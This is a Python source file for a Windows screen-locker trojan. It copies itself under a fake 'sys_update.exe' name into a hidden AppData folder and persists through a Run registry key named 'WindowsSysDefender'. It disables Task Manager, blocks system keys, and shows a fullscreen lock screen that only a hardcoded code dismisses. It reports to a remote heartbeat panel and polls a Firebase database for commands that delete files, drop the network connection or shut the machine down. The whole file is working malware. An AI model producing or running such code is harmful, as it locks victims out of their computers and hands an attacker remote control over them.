import tkinter as tk
import keyboard
import sys
import os
import shutil
import ctypes
import winreg
import subprocess
import threading
import time
import requests
import uuid

UNLOCK_CODE = "VIP123"
PANEL_URL = "https://vipchaetos.onrender.com/api/heartbeat"  # Palitan ang <ang-render-app-mo> ng iyong totoong Render App URL

if getattr(sys, 'frozen', False):
    current_path = sys.executable
else:
    current_path = os.path.abspath(__file__)

hidden_dir = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Themes", "Cache")
if not os.path.exists(hidden_dir):
    try:
        os.makedirs(hidden_dir)
    except:
        pass

target_path = os.path.join(hidden_dir, "sys_update.exe")

def hide_and_persist():
    try:
        if os.path.abspath(current_path).lower() != os.path.abspath(target_path).lower():
            if os.path.exists(target_path):
                ctypes.windll.kernel32.SetFileAttributesW(target_path, 0x80)
                os.remove(target_path)
            shutil.copyfile(current_path, target_path)
        
        ctypes.windll.kernel32.SetFileAttributesW(target_path, 0x02 | 0x04)

        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "WindowsSysDefender", 0, winreg.REG_SZ, f'"{target_path}"')
    except:
        pass

def disable_system_keys():
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    except:
        pass

def get_hwid():
    try:
        cmd = "wmic csproduct get uuid"
        uuid_str = subprocess.check_output(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()
        if uuid_str:
            return uuid_str
    except:
        pass
    return str(uuid.getnode())

def heartbeat_loop():
    hwid = get_hwid()
    while True:
        try:
            payload = {"hwid": hwid}
            requests.post(PANEL_URL, json=payload, timeout=5)
        except:
            pass
        time.sleep(10)

def command_listener_loop():
    hwid = get_hwid()
    db_url = f"https://vipchaetos-default-rtdb.firebaseio.com/clients/{hwid}/pending_action.json"
    
    creation_flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)

    while True:
        try:
            response = requests.get(db_url, timeout=5)
            if response.status_code == 200 and response.json():
                action = response.json()
                
                requests.delete(db_url)

                if action == 'uninstall':
                    bat_path = os.path.join(os.getenv('TEMP'), "App-Uninstaller-Combined.bat")
                    if os.path.exists(bat_path):
                        subprocess.Popen(f'cmd.exe /c start cmd.exe /k "{bat_path}"', shell=True, creationflags=creation_flags)
                elif action == 'clean':
                    subprocess.Popen('cmd.exe /c del /q /f /s "%TEMP%\\*.*"', shell=True, creationflags=creation_flags)
                elif action == 'netcrash':
                    subprocess.Popen('ipconfig /release', shell=True, creationflags=creation_flags)
                elif action == 'netrestore':
                    subprocess.Popen('ipconfig /renew', shell=True, creationflags=creation_flags)
                elif action == 'restart':
                    subprocess.Popen('shutdown /r /t 0', shell=True, creationflags=creation_flags)
                elif action == 'shutdown':
                    subprocess.Popen('shutdown /s /t 0', shell=True, creationflags=creation_flags)
        except:
            pass
        time.sleep(3)

def self_destruct_and_unlock():
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
    except:
        pass

    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.DeleteValue(reg_key, "WindowsSysDefender")
    except:
        pass

    try:
        subprocess.Popen('schtasks /delete /tn "WindowsSysDefenderTask" /f', shell=True)
    except:
        pass

    try:
        ctypes.windll.kernel32.SetFileAttributesW(target_path, 0x80)
        if os.path.exists(target_path):
            subprocess.Popen(f'cmd.exe /c timeout /t 1 /nobreak > nul & del /f /q "{target_path}"', shell=True)
    except:
        pass

    try:
        keyboard.unhook_all()
    except:
        pass

    try:
        root.destroy()
    except:
        pass
    sys.exit()

def check_password(event=None):
    if entry_pass.get() == UNLOCK_CODE:
        self_destruct_and_unlock()
    else:
        lbl_error.config(text="Mali ang password!")
        entry_pass.delete(0, tk.END)

hide_and_persist()
disable_system_keys()

t_heartbeat = threading.Thread(target=heartbeat_loop, daemon=True)
t_heartbeat.start()

t_command = threading.Thread(target=command_listener_loop, daemon=True)
t_command.start()

root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.config(bg="black")

root.protocol("WM_DELETE_WINDOW", lambda: None)

frame = tk.Frame(root, bg="black")
frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)

lbl_title = tk.Label(frame, text="VIP LOCK SCREEN", font=("Arial", 24, "bold"), fg="red", bg="black")
lbl_title.pack(pady=10)

entry_pass = tk.Entry(frame, show="*", font=("Arial", 16), justify="center")
entry_pass.pack(pady=10)
entry_pass.bind("<Return>", check_password)
entry_pass.focus()

btn_unlock = tk.Button(frame, text="UNLOCK", font=("Arial", 12, "bold"), bg="green", fg="white", command=check_password)
btn_unlock.pack(pady=5)

lbl_error = tk.Label(frame, text="", font=("Arial", 10), fg="red", bg="black")
lbl_error.pack()

try:
    keyboard.block_key('windows')
    keyboard.block_key('alt')
    keyboard.block_key('tab')
    keyboard.block_key('escape')
    keyboard.block_key('ctrl')
except:
    pass

root.mainloop()